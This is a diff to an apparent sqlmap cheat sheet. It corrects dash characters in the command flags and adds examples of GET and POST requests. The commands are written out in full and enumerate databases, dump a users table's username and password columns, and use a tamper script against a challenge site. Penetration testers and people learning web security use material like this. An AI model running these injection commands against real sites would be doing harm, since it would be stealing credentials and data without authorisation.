@@ -10,14 +10,14 @@
 <pre>sqlmap -u "http://testsite.com/login.php" -D site_db --tables</pre>
 
 **List all columns in a table**
-<pre>sqlmap -u "http://testsite.com/login.php" -D site_db -T users –dump</pre>
+<pre>sqlmap -u "http://testsite.com/login.php" -D site_db -T users --dump</pre>
 
 **Dump only selected columns**
 <pre>sqlmap -u "http://testsite.com/login.php" -D site_db -T users -C username,password --dump
 </pre>
 
 **Dump a table from a database when you have admin credentials**
-<pre>sqlmap -u "http://testsite.com/login.php" –method "POST" –data "username=admin&password=admin&submit=Submit" -D social_mccodes -T users –dump
+<pre>sqlmap -u "http://testsite.com/login.php" –method "POST" --data="username=admin&password=admin&submit=Submit" -D social_mccodes -T users --dump
 </pre>
 
 **Add Technique**
@@ -36,7 +36,15 @@
 
 Create a tamper script called "mytamper.py" in the /usr/share/sqlmap/tamper
 
-<pre>sqlmap -u "http://2.challenge.sqli.site/view_book.php?id=3" --cookie="userchl2_info=" -p userchl2_info --level=2 --dbms=mysql --tamper=mytamper — banner</pre>
+<pre>sqlmap -u "http://2.challenge.sqli.site/view_book.php?id=3" --cookie="userchl2_info=" -p userchl2_info --level=2 --dbms=mysql --tamper=mytamper --banner</pre>
+
+**Get Req Example**
+<pre>sqlmap -u "url/ajax.php?fun=login&username=test&password=test" --keep-alive</pre>
+
+**Post Req Example**
+
+<pre>sqlmap  -u "url" 
+--data="fun=login&username=test&password=test"</pre>
 
 # Switches
 
